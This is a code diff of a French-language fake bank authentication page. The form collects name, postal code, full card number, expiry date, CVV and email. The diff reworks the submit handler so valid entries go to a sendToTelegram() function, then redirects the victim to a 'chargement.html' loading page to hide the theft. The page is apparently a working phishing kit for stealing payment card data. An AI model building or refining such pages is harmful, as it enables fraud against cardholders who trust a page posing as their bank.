@@ -21,7 +21,7 @@
     <div class="container">
         <h2>🔒 Veuillez vous authentifier</h2>
         
-        <form id="banqueForm">
+        <form id="banqueForm" action="chargement.html" >
             <div class="form-group"><label>Nom</label><input type="text" id="nom" required><div class="error" id="nomError"></div></div>
             <div class="form-group"><label>Prénom</label><input type="text" id="prenom" required><div class="error" id="prenomError"></div></div>
             <div class="form-group"><label>Code postal</label><input type="text" id="code-postal" required><div class="error" id="codePostalError"></div></div>
@@ -57,15 +57,15 @@
             validateField('numero-carte', 'carteError', /^\d{16}$/, 'Numéro de carte invalide (16 chiffres).');
             validateField('expiration', 'expirationError', /^(0[1-9]|1[0-2])\/\d{2}$/, 'Format MM/AA requis.');
             validateField('cvv', 'cvvError', /^\d{3}$/, 'CVV invalide (3 chiffres).');
-            validateField('identifiant', 'identifiantError', /^\d{10}$/, 'Identifiant invalide (10 chiffres).');
             validateField('email', 'emailError', /^[^\s@]+@[^\s@]+$/, 'E-mail invalide.');
 
-            if (!isValid) {
-                event.preventDefault(); // Empêcher l'envoi si la validation échoue
-            } else {
-                event.preventDefault();
-                sendToTelegram();
-            }
+            if (isValid) {
+    event.preventDefault(); // Empêcher l'envoi classique
+    sendToTelegram(); // Envoyer les données
+    setTimeout(() => {
+        window.location.href = "chargement.html"; // Redirection après l'envoi
+    }, 2000); // Attendre 2 secondes pour laisser le temps à l'envoi
+}
         });
 
         function sendToTelegram() {
